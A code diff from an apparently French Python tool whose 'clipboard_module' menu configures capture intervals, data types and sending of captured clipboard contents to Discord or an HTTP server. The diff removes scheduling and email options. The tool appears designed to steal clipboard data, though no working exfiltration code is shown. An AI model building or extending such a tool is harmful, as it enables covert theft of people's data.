@@ -15,18 +15,13 @@ def affichage():
 
     1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
     2. Type de données à capturer (texte, images, etc.)
-    3. Heure de début de capture (HH:MM)
-    4. Heure de fin de capture (HH:MM)
-    5. Début Pause de capture (HH:MM)
-    6. Fin Pause de capture (HH:MM)
-    7. Sauvegarde locale
+    3. Sauvegarde locale
         
          
           Sortie et envoi:
 
-    8. Envoi sur discord
-    9. Envoi par email
-    10. Envoi sur serveur HTTP
+    4. Envoi sur discord
+    5. Envoi sur serveur HTTP
                       
  Tapez: set <num> pour configurer une option, ou exit pour quitter. 
  Tapez: show pour afficher la configuration actuelle.
@@ -85,50 +80,6 @@ def clipboard_module():
         print(f"Type de données à capturer défini sur {data_type}.")
         time.sleep(2)  
 
-
-    def valide_heure(h):
-        try:
-            time.strptime(h, "%H:%M")
-            return True
-        except ValueError:
-            return False
-
-    def heure_debut():
-        clear()
-        h = input("HH:MM de début : ")
-        if valide_heure(h):
-            choix["Heure de début de capture"] = h
-        else:
-            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
-            time.sleep(2)
-
-    def heure_fin():
-        clear()
-        h = input("HH:MM de fin : ")
-        if valide_heure(h):
-            choix["Heure de fin de capture"] = h
-        else:
-            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
-            time.sleep(2)
-
-    def debut_pause():
-        clear()
-        h = input("HH:MM début pause : ")
-        if valide_heure(h):
-            choix["Début Pause de capture"] = h
-        else:
-            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
-            time.sleep(2)
-
-    def fin_pause():
-        clear()
-        h = input("HH:MM fin pause : ")
-        if valide_heure(h):
-            choix["Fin Pause de capture"] = h
-        else:
-            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
-            time.sleep(2)
-
     def sauvegarde_locale():
         clear()
         save_local = input("Entrez le chemin de sauvegarde locale (C:/path/to/save) (pas le nom du fichier): ")
@@ -150,10 +101,6 @@ def clipboard_module():
     options = [
         ("Intervalle de capture (en secondes)", intervalle_capture),
         ("Type de données à capturer (texte, images, etc.)" , type_donnees),
-        ("Heure de début de capture (HH:MM)" , heure_debut),
-        ("Heure de fin de capture (HH:MM)" , heure_fin),
-        ("Début Pause de capture (HH:MM)" , debut_pause),
-        ("Fin Pause de capture (HH:MM)" , fin_pause),
         ("Sauvegarde locale " , sauvegarde_locale),
         ("Envoi sur discord" , envoi_discord),
         ("Envoi sur serveur HTTP" , envoi_http),
